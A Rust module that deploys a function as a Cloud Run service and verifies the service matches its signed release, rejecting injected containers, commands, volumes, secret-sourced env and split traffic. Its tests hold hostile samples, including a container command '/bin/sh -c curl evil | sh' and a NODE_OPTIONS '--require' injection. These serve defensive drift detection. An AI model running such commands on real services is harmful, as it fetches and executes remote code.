//! Write a planned function as a Cloud Run service and check it reads back
//! the same.
//!
//! The verifier sends the whole service template it built, so a field the
//! control plane set behind its back (a second container, a volume, a
//! command, another service account) is replaced, and the read-back refuses
//! any field it doesn't know.

use std::collections::BTreeMap;
use std::time::Duration;

use alien_error::AlienError;
use async_trait::async_trait;
use serde_json::{json, Value};

use crate::error::{ErrorData, Result};
use crate::plan::FunctionSpec;

/// The Cloud Run calls the verifier makes.
#[async_trait]
pub trait ServiceStore: Send + Sync {
    /// GET the service, exactly as returned.
    async fn get(&self, name: &str) -> Result<Value>;
    /// PATCH the service with `service`, replacing its template.
    async fn replace(&self, name: &str, service: &Value) -> Result<()>;
    /// GET the service, or `None` when it doesn't exist.
    async fn find(&self, name: &str) -> Result<Option<Value>>;
    /// Create service `name` from `service`.
    async fn create(&self, name: &str, service: &Value) -> Result<()>;
    /// The service's IAM policy.
    async fn policy(&self, name: &str) -> Result<Value>;
    /// Replace the service's IAM policy with `policy`, which carries the etag it was read at.
    async fn set_policy(&self, name: &str, policy: &Value) -> Result<()>;
}

/// The role a private service's own account needs: Pub/Sub and Cloud Scheduler sign their
/// requests as it.
const INVOKER: &str = "roles/run.invoker";

/// The service body the verifier writes for `spec`.
pub fn service_body(spec: &FunctionSpec) -> Value {
    let env: Vec<Value> = spec
        .env
        .iter()
        .map(|(name, value)| json!({"name": name, "value": value}))
        .collect();
    json!({
        "template": {
            "serviceAccount": spec.run_as,
            "timeout": format!("{}s", spec.timeout_seconds),
            "containers": [{
                "image": spec.image_uri,
                "env": env,
                // CPU only while serving requests: Cloud Run refuses less
                // than 512Mi with CPU always allocated.
                "resources": {
                    "limits": {"memory": format!("{}Mi", spec.memory_mb), "cpu": "1"},
                    "cpuIdle": true,
                },
            }],
        },
        // Every request goes to the revision this template creates; no
        // older revision stays reachable by a split or a tag.
        "traffic": [{"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "percent": 100}],
    })
}

const UPDATE_WAIT: Duration = Duration::from_secs(300);
const POLL: Duration = Duration::from_secs(3);

/// Write `spec` and read it back, creating the service when it doesn't exist: setup renders
/// no workload, and management may not create one on a protected install. A service the
/// verifier creates takes requests from the internet only when the signed stack gives the
/// workload a public endpoint; a private one admits its own account as invoker.
pub async fn apply(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<Value> {
    if store.find(&spec.name).await?.is_none() {
        let mut service = service_body(spec);
        if spec.public {
            service["ingress"] = json!("INGRESS_TRAFFIC_ALL");
            service["invokerIamDisabled"] = json!(true);
        } else {
            service["ingress"] = json!("INGRESS_TRAFFIC_INTERNAL_ONLY");
        }
        store.create(&spec.name, &service).await?;
    } else {
        store.replace(&spec.name, &service_body(spec)).await?;
    }
    let service = settled(store, spec).await?;
    if !spec.public {
        admit_own_account(store, spec).await?;
    }
    Ok(service)
}

/// Grant the service's own account the invoker role, unless the policy holds it already.
async fn admit_own_account(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<()> {
    let member = format!("serviceAccount:{}", spec.run_as);
    let mut policy = store.policy(&spec.name).await?;
    let bindings = policy["bindings"].as_array().cloned().unwrap_or_default();
    let admitted = bindings.iter().any(|binding| {
        binding["role"] == INVOKER
            && binding.get("condition").is_none()
            && binding["members"]
                .as_array()
                .is_some_and(|members| members.iter().any(|existing| existing == &json!(member)))
    });
    if admitted {
        return Ok(());
    }
    let mut bindings = bindings;
    bindings.push(json!({"role": INVOKER, "members": [member]}));
    policy["bindings"] = Value::Array(bindings);
    store.set_policy(&spec.name, &policy).await
}

/// Wait for the service to finish reconciling, then check it reads back as `spec`.
async fn settled(store: &dyn ServiceStore, spec: &FunctionSpec) -> Result<Value> {
    let deadline = tokio::time::Instant::now() + UPDATE_WAIT;
    loop {
        let service = store.get(&spec.name).await?;
        let reconciling = service["reconciling"].as_bool().unwrap_or(false);
        if !reconciling {
            check_read_back(spec, &service)?;
            return Ok(service);
        }
        if tokio::time::Instant::now() > deadline {
            return Err(AlienError::new(ErrorData::CloudCallFailed {
                operation: format!("waiting for service {} to finish updating", spec.name),
            }));
        }
        tokio::time::sleep(POLL).await;
    }
}

/// Template keys the verifier understands.
const KNOWN_TEMPLATE: &[&str] = &[
    // The tool that last deployed the template, for display only.
    "client",
    "clientVersion",
    "revision",
    "labels",
    "annotations",
    "scaling",
    "vpcAccess",
    "timeout",
    "serviceAccount",
    "containers",
    "volumes",
    "executionEnvironment",
    "encryptionKey",
    "maxInstanceRequestConcurrency",
    "sessionAffinity",
    "healthCheckDisabled",
    "nodeSelector",
    "gpuZonalRedundancyDisabled",
];
/// Container keys the verifier understands.
const KNOWN_CONTAINER: &[&str] = &[
    "name",
    "image",
    "command",
    "args",
    "env",
    "resources",
    "ports",
    "volumeMounts",
    "workingDir",
    "livenessProbe",
    "startupProbe",
    "dependsOn",
    "baseImageUri",
    "buildInfo",
];

/// Whether `value` carries nothing: null, false, an empty string, array or object.
fn is_empty(value: &Value) -> bool {
    match value {
        Value::Null | Value::Bool(false) => true,
        Value::String(text) => text.is_empty(),
        Value::Array(items) => items.is_empty(),
        Value::Object(fields) => fields.values().all(is_empty),
        _ => false,
    }
}

/// Check that a Cloud Run service is the one `spec` describes.
pub fn check_read_back(spec: &FunctionSpec, service: &Value) -> Result<()> {
    let mismatch = |reason: String| {
        AlienError::new(ErrorData::ReadBackMismatch {
            function: spec.name.clone(),
            reason,
        })
    };
    let unknown = |section: &str, value: &Value, known: &[&str]| -> Result<()> {
        let fields = value
            .as_object()
            .ok_or_else(|| mismatch(format!("{section} is not an object")))?;
        for (key, value) in fields {
            if !known.contains(&key.as_str()) && !is_empty(value) {
                return Err(mismatch(format!(
                    "{section} has field {key}, which the verifier doesn't know"
                )));
            }
        }
        Ok(())
    };
    let template = &service["template"];
    unknown("the template", template, KNOWN_TEMPLATE)?;
    let containers = template["containers"]
        .as_array()
        .ok_or_else(|| mismatch("it has no containers".to_string()))?;
    let [container] = containers.as_slice() else {
        return Err(mismatch(format!("it has {} containers", containers.len())));
    };
    unknown("the container", container, KNOWN_CONTAINER)?;

    let text = |value: &Value| value.as_str().unwrap_or_default().to_string();
    if container["image"].as_str() != Some(spec.image_uri.as_str()) {
        return Err(mismatch(format!(
            "it runs image {}",
            text(&container["image"])
        )));
    }
    if template["serviceAccount"].as_str() != Some(spec.run_as.as_str()) {
        return Err(mismatch(format!(
            "it runs as {}",
            text(&template["serviceAccount"])
        )));
    }
    if template["timeout"].as_str() != Some(format!("{}s", spec.timeout_seconds).as_str()) {
        return Err(mismatch(format!("timeout is {}", template["timeout"])));
    }
    if container["resources"]["limits"]["memory"].as_str()
        != Some(format!("{}Mi", spec.memory_mb).as_str())
    {
        return Err(mismatch(format!(
            "memory is {}",
            container["resources"]["limits"]["memory"]
        )));
    }
    let mut env = BTreeMap::new();
    for item in container["env"].as_array().cloned().unwrap_or_default() {
        let name = text(&item["name"]);
        // A value read from a secret is code the release didn't sign.
        if !is_empty(&item["valueSource"]) {
            return Err(mismatch(format!("env {name} is read from a secret")));
        }
        env.insert(name, text(&item["value"]));
    }
    if env != spec.env {
        return Err(mismatch(format!(
            "env differs for {:?}",
            crate::plan::changed_env(&env, &spec.env)
        )));
    }
    for field in ["command", "args", "volumeMounts", "workingDir", "dependsOn"] {
        if !is_empty(&container[field]) {
            return Err(mismatch(format!("its container sets {field}")));
        }
    }
    if !is_empty(&template["volumes"]) {
        return Err(mismatch("it mounts volumes".to_string()));
    }
    check_serving(service).map_err(mismatch)
}

/// The last path segment of a revision name.
fn short_name(name: &str) -> &str {
    name.rsplit('/').next().unwrap_or(name)
}

/// Refuse a service that doesn't serve all traffic from the revision its
/// template created, or whose revision isn't ready: the template reading
/// back right says nothing about what answers requests.
fn check_serving(service: &Value) -> std::result::Result<(), String> {
    let created = service["latestCreatedRevision"]
        .as_str()
        .filter(|name| !name.is_empty())
        .ok_or("it names no created revision")?;
    let ready = service["latestReadyRevision"].as_str().unwrap_or_default();
    if ready != created {
        return Err(format!(
            "revision {} is not ready (the latest ready one is '{}')",
            short_name(created),
            short_name(ready)
        ));
    }
    let condition = &service["terminalCondition"];
    if condition["type"].as_str() != Some("Ready")
        || condition["state"].as_str() != Some("CONDITION_SUCCEEDED")
    {
        return Err(format!("the service is not ready: {condition}"));
    }
    let statuses = service["trafficStatuses"]
        .as_array()
        .ok_or("it reports no traffic")?;
    let [status] = statuses.as_slice() else {
        return Err(format!(
            "traffic is split or tagged over {} targets",
            statuses.len()
        ));
    };
    let revision = status["revision"].as_str().unwrap_or_default();
    let to_created = revision == short_name(created)
        || (revision.is_empty()
            && status["type"].as_str() == Some("TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST"));
    if !to_created || status["percent"].as_i64() != Some(100) {
        return Err(format!(
            "traffic goes to {status}, not 100% to revision {}",
            short_name(created)
        ));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::fixtures::DIGEST;
    use std::sync::Mutex;

    fn spec() -> FunctionSpec {
        FunctionSpec {
            workload: "api".into(),
            vpc: None,
            name: "acme-fn-api".into(),
            image_uri: format!("us-central1-docker.pkg.dev/p/acme/api@{DIGEST}"),
            digest: DIGEST.into(),
            env: BTreeMap::from([("MODE".into(), "signed".into())]),
            memory_mb: 512,
            timeout_seconds: 30,
            architecture: "x86_64".into(),
            run_as: "acme-execution@p.iam.gserviceaccount.com".into(),
            public: false,
            dapr: false,
            registry: None,
        }
    }

    /// A service as Cloud Run returns it once the verifier's body is applied.
    fn service(spec: &FunctionSpec) -> Value {
        let mut service = service_body(spec);
        service["name"] = json!(format!(
            "projects/p/locations/us-central1/services/{}",
            spec.name
        ));
        service["reconciling"] = json!(false);
        service["latestCreatedRevision"] = json!(format!(
            "projects/p/locations/us-central1/services/{}/revisions/{}-00002-x7k",
            spec.name, spec.name
        ));
        service["latestReadyRevision"] = service["latestCreatedRevision"].clone();
        service["terminalCondition"] = json!({"type": "Ready", "state": "CONDITION_SUCCEEDED"});
        service["trafficStatuses"] = json!([{
            "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
            "revision": format!("{}-00002-x7k", spec.name),
            "percent": 100,
        }]);
        let template = &mut service["template"];
        template["scaling"] = json!({"maxInstanceCount": 100});
        template["maxInstanceRequestConcurrency"] = json!(80);
        template["containers"][0]["name"] = json!("api-1");
        template["containers"][0]["ports"] = json!([{"name": "http1", "containerPort": 8080}]);
        template["containers"][0]["startupProbe"] = json!({"tcpSocket": {"port": 8080}});
        template["containers"][0]["resources"]["startupCpuBoost"] = json!(true);
        template["client"] = json!("gcloud");
        template["clientVersion"] = json!("586.0.0");
        // A field Cloud Run added that the verifier doesn't know, still empty.
        template["sandboxes"] = json!({});
        service
    }

    #[test]
    fn the_service_as_built_reads_back() {
        check_read_back(&spec(), &service(&spec())).unwrap();
    }

    #[test]
    fn a_service_changed_behind_the_verifier_is_caught() {
        let reason = |change: &dyn Fn(&mut Value)| {
            let mut changed = service(&spec());
            change(&mut changed);
            check_read_back(&spec(), &changed)
                .expect_err("must not match")
                .to_string()
        };
        assert!(
            reason(&|s| s["template"]["containers"][0]["env"][0]["value"] = json!("attacker"))
                .contains("env differs")
        );
        assert!(reason(&|s| s["template"]["containers"][0]["env"]
            .as_array_mut()
            .unwrap()
            .push(json!({"name": "NODE_OPTIONS", "value": "--require /tmp/x"})))
        .contains("NODE_OPTIONS"));
        assert!(reason(&|s| s["template"]["containers"][0]["env"][0] =
            json!({"name": "MODE", "valueSource": {"secretKeyRef": {"secret": "x"}}}))
        .contains("read from a secret"));
        assert!(reason(
            &|s| s["template"]["serviceAccount"] = json!("owner@p.iam.gserviceaccount.com")
        )
        .contains("runs as"));
        assert!(
            reason(&|s| s["template"]["containers"][0]["command"] = json!(["/bin/sh"]))
                .contains("sets command")
        );
        assert!(reason(&|s| s["template"]["containers"]
            .as_array_mut()
            .unwrap()
            .push(json!({"image": "evil"})))
        .contains("2 containers"));
        assert!(reason(
            &|s| s["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}])
        )
        .contains("volumes"));
    }

    #[test]
    fn only_the_created_and_ready_revision_may_serve() {
        let reason = |change: &dyn Fn(&mut Value)| {
            let mut changed = service(&spec());
            change(&mut changed);
            crate::describe(&check_read_back(&spec(), &changed).expect_err("must not match"))
        };
        // Attack: keep 90% of requests on an older revision that runs
        // another image.
        assert_eq!(
            reason(&|s| s["trafficStatuses"] = json!([
                {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "percent": 90},
                {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "revision": "acme-fn-api-00002-x7k", "percent": 10},
            ])),
            "Function 'acme-fn-api' does not match its signed release: traffic is split or tagged over 2 targets"
        );
        // Attack: all traffic pinned to the older revision.
        assert!(reason(&|s| s["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "percent": 100},
        ]))
        .contains("not 100% to revision acme-fn-api-00002-x7k"));
        // Attack: a tag keeps the old revision reachable at its own URL.
        assert!(reason(&|s| s["trafficStatuses"]
            .as_array_mut()
            .unwrap()
            .push(json!({"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "tag": "old"})))
        .contains("split or tagged over 2 targets"));
        // The new revision failed to start; the old one still serves.
        assert!(reason(&|s| s["latestReadyRevision"] = json!(
            "projects/p/locations/us-central1/services/acme-fn-api/revisions/acme-fn-api-00001-old"
        ))
        .contains("revision acme-fn-api-00002-x7k is not ready (the latest ready one is 'acme-fn-api-00001-old')"));
        assert!(
            reason(&|s| s["terminalCondition"]["state"] = json!("CONDITION_FAILED"))
                .contains("the service is not ready")
        );
    }

    /// What Cloud Run returned for a service with two revisions, before and
    /// after the verifier's PATCH (us-central1, 2026-11-05).
    #[test]
    fn real_traffic_reports_read_as_cloud_run_returns_them() {
        let revisions = "projects/p/locations/us-central1/services/acme-fn-api/revisions";
        let mut split = service(&spec());
        split["latestCreatedRevision"] = json!(format!("{revisions}/acme-fn-api-00002-cqd"));
        split["latestReadyRevision"] = split["latestCreatedRevision"].clone();
        split["terminalCondition"] = json!({"type": "Ready", "state": "CONDITION_SUCCEEDED", "lastTransitionTime": "2026-11-05T14:28:54.447929Z"});
        split["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-k95", "percent": 90},
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "revision": "acme-fn-api-00002-cqd", "percent": 10},
        ]);
        assert!(check_read_back(&spec(), &split).is_err());

        let mut patched = split;
        patched["latestCreatedRevision"] = json!(format!("{revisions}/acme-fn-api-00003-bj6"));
        patched["latestReadyRevision"] = patched["latestCreatedRevision"].clone();
        patched["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST", "revision": "acme-fn-api-00003-bj6", "percent": 100},
        ]);
        check_read_back(&spec(), &patched).unwrap();
    }

    #[test]
    fn a_field_the_verifier_does_not_know_refuses_the_service() {
        let mut service = service(&spec());
        service["template"]["containers"][0]["sidecarMagic"] = json!({"enabled": true});
        let error = check_read_back(&spec(), &service).unwrap_err().to_string();
        assert!(
            error.contains("sidecarMagic, which the verifier doesn't know"),
            "{error}"
        );
    }

    struct FakeRun {
        service: Mutex<Option<Value>>,
        policy: Mutex<Value>,
        calls: Mutex<Vec<String>>,
    }

    impl FakeRun {
        fn holding(service: Value, policy: Value) -> Self {
            Self {
                service: Mutex::new(Some(service)),
                policy: Mutex::new(policy),
                calls: Mutex::new(Vec::new()),
            }
        }

        fn empty() -> Self {
            Self {
                service: Mutex::new(None),
                policy: Mutex::new(json!({"etag": "e1"})),
                calls: Mutex::new(Vec::new()),
            }
        }

        fn serving(&self, body: &Value) {
            let mut held = self.service.lock().unwrap();
            let current = held.get_or_insert_with(|| {
                let mut created = service(&spec());
                created["ingress"] = body["ingress"].clone();
                created
            });
            current["template"] = body["template"].clone();
            current["trafficStatuses"] = json!([{
                "type": "TRAFFIC_TARGET_ALLOCATION_TYPE_LATEST",
                "revision": "acme-fn-api-00002-x7k",
                "percent": 100,
            }]);
        }
    }

    #[async_trait]
    impl ServiceStore for FakeRun {
        async fn get(&self, _name: &str) -> Result<Value> {
            Ok(self.service.lock().unwrap().clone().unwrap())
        }
        async fn find(&self, _name: &str) -> Result<Option<Value>> {
            Ok(self.service.lock().unwrap().clone())
        }
        async fn create(&self, name: &str, body: &Value) -> Result<()> {
            self.calls.lock().unwrap().push(format!(
                "create {name} ingress={} invokerIamDisabled={}",
                body["ingress"], body["invokerIamDisabled"]
            ));
            self.serving(body);
            Ok(())
        }
        async fn replace(&self, name: &str, body: &Value) -> Result<()> {
            self.calls.lock().unwrap().push(format!("replace {name}"));
            self.serving(body);
            Ok(())
        }
        async fn policy(&self, _name: &str) -> Result<Value> {
            Ok(self.policy.lock().unwrap().clone())
        }
        async fn set_policy(&self, name: &str, policy: &Value) -> Result<()> {
            self.calls
                .lock()
                .unwrap()
                .push(format!("setIamPolicy {name} {}", policy["bindings"]));
            *self.policy.lock().unwrap() = policy.clone();
            Ok(())
        }
    }

    fn invoker() -> Value {
        json!({"role": "roles/run.invoker", "members": [format!("serviceAccount:{}", spec().run_as)]})
    }

    #[tokio::test]
    async fn apply_replaces_the_whole_template() {
        let mut drifted = service(&spec());
        drifted["template"]["containers"][0]["command"] =
            json!(["/bin/sh", "-c", "curl evil | sh"]);
        drifted["template"]["volumes"] = json!([{"name": "v", "gcs": {"bucket": "b"}}]);
        drifted["trafficStatuses"] = json!([
            {"type": "TRAFFIC_TARGET_ALLOCATION_TYPE_REVISION", "revision": "acme-fn-api-00001-old", "percent": 100},
        ]);
        let run = FakeRun::holding(drifted, json!({"etag": "e1", "bindings": [invoker()]}));
        apply(&run, &spec()).await.unwrap();
        check_read_back(&spec(), run.service.lock().unwrap().as_ref().unwrap()).unwrap();
        assert_eq!(
            *run.calls.lock().unwrap(),
            ["replace acme-fn-api"],
            "the invoker already holds the role"
        );
    }

    #[tokio::test]
    async fn a_missing_private_service_is_created_internal_and_its_account_may_invoke_it() {
        // Setup renders no workload, and management may not create one on a protected install.
        let run = FakeRun::empty();
        apply(&run, &spec()).await.unwrap();
        check_read_back(&spec(), run.service.lock().unwrap().as_ref().unwrap()).unwrap();
        assert_eq!(
            *run.calls.lock().unwrap(),
            [
                "create acme-fn-api ingress=\"INGRESS_TRAFFIC_INTERNAL_ONLY\" invokerIamDisabled=null"
                    .to_string(),
                format!("setIamPolicy acme-fn-api {}", json!([invoker()])),
            ]
        );
        assert_eq!(
            run.policy.lock().unwrap()["etag"],
            json!("e1"),
            "written at the etag read"
        );
    }

    #[tokio::test]
    async fn a_missing_public_service_is_created_open_without_invoker_grants() {
        let public = FunctionSpec {
            public: true,
            ..spec()
        };
        let run = FakeRun::empty();
        apply(&run, &public).await.unwrap();
        assert_eq!(
            *run.calls.lock().unwrap(),
            ["create acme-fn-api ingress=\"INGRESS_TRAFFIC_ALL\" invokerIamDisabled=true"]
        );
    }
}
